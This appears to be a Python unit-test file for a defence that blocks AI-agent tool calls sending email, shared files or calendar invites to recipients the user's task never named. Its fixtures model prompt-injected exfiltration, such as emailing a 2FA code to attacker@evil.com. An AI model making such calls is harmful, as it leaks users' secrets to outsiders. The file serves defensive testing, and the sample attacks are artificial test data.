# SPDX-License-Identifier: AGPL-3.0-or-later
"""Unit tests for the live egress-provenance gate (offline; no model, no gateway)."""
from simurgh_agentdojo_adapter.live_defence import (
    _destinations,
    _grounded,
    gate_tool_call,
)


def test_destinations_parses_str_list_and_csv():
    assert _destinations("a@x.com") == ["a@x.com"]
    assert _destinations(["a@x.com", "b@y.com"]) == ["a@x.com", "b@y.com"]
    assert _destinations("a@x.com, b@y.com; c@z.com") == ["a@x.com", "b@y.com", "c@z.com"]
    assert _destinations(None) == []


def test_grounded_matches_address_or_local_part():
    assert _grounded("john.doe@bluesparrowtech.com", "email john.doe@bluesparrowtech.com about lunch")
    assert _grounded("bob@anything.com", "please send an email to bob about the meeting")
    assert not _grounded("attacker@evil.com", "summarize my calendar for today")
    # too-short local part is not treated as a match token
    assert not _grounded("a@evil.com", "the answer is a good plan")


def test_injection_egress_to_attacker_is_blocked():
    decision, bad = gate_tool_call(
        "send_email",
        {"recipients": ["attacker@evil.com"], "subject": "x", "body": "the 2FA code is 123"},
        "What appointments do I have today?",
    )
    assert decision == "blocked"
    assert bad == ["attacker@evil.com"]


def test_benign_egress_to_task_named_recipient_is_allowed():
    decision, bad = gate_tool_call(
        "send_email",
        {"recipients": ["john.doe@bluesparrowtech.com"], "subject": "lunch", "body": "1pm?"},
        "Send an email to john.doe@bluesparrowtech.com to confirm lunch.",
    )
    assert decision == "allowed"
    assert bad == []


def test_mixed_recipients_block_if_any_unauthorized():
    decision, bad = gate_tool_call(
        "send_email",
        {"recipients": ["bob@bluesparrowtech.com", "attacker@evil.com"]},
        "email bob the summary",
    )
    assert decision == "blocked"
    assert "attacker@evil.com" in bad and "bob@bluesparrowtech.com" not in bad


def test_share_file_and_calendar_invite_are_egress():
    assert gate_tool_call("share_file", {"email": "attacker@evil.com"}, "share with my team")[0] == "blocked"
    assert (
        gate_tool_call("create_calendar_event", {"participants": ["x@evil.com"]}, "meet with sara")[0]
        == "blocked"
    )


def test_non_egress_tools_are_never_blocked():
    for tool, args in [
        ("search_calendar_events", {"query": "x"}),
        ("get_received_emails", {}),
        ("read_file", {"file_id": "1"}),
        ("create_file", {"filename": "f", "content": "hello"}),
    ]:
        assert gate_tool_call(tool, args, "any task")[0] == "allowed"
